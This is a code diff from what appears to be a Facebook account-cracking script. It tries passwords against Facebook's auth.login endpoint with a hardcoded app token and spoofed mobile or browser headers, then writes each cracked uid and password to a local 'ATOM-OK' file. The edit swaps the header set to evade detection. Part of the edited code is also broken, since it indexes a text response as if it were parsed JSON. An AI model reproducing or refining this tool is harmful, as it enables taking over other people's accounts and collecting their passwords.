@@ -464,28 +464,33 @@ def _M3_(ids,pasx):
                         'fb_api_req_friendly_name': 'authenticate'}
 
                         head={
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4361.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;', 
-                        'Accept-Encoding': 'gzip, deflate', 
-                        'Accept': '*/*', 
-                        'Connection': 'keep-alive', 
-                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
-                        'X-FB-Friendly-Name': 'authenticate', 
-                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
-                        'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
-                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
-                        'X-FB-Connection-Type': 'unknown',
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'X-FB-HTTP-Engine': 'Liger'}
+                             "method": 'GET', 
+                             "path": '/',
+                             "scheme": 'https', 
+                             "authority": 'p.facebook.com',
+                             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                             "accept-language": 'en-US,en;q=0.9',
+                             "cache-control": 'max-age=0',
+                             "sec-ch-ua": '"Chromium";v="111", "Not(A:Brand";v="8"',
+                             "sec-ch-ua-mobile": '?1',
+                             "sec-ch-ua-platform": '"Android"',
+                             "sec-fetch-dest": 'document',
+                             "sec-fetch-mode": 'navigate',
+                             "sec-fetch-site": 'none',
+                             "sec-fetch-user": '?1',
+                             "upgrade-insecure-requests": '1',
+                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
 
                         url1="https://p.facebook.com/method/auth.login"
-                        BLACK=session.post(url1,data=data, headers=head).json()
-                        if 'session_key' in BLACK:
+                        BLACK=session.post(url1,data=data,headers=head,allow_redirects=False).text
+                        q = json.loads(BLACK)
+                        if 'session_key' in q:
                                 uid = BLACK["uid"]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
                                 open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
                                 ok.append(uid)
                                 break
-                        elif 'www.facebook.com' in str(BLACK):
+                        elif 'www.facebook.com' in str(q):
                                 uid = BLACK["uid"]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
                                 open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
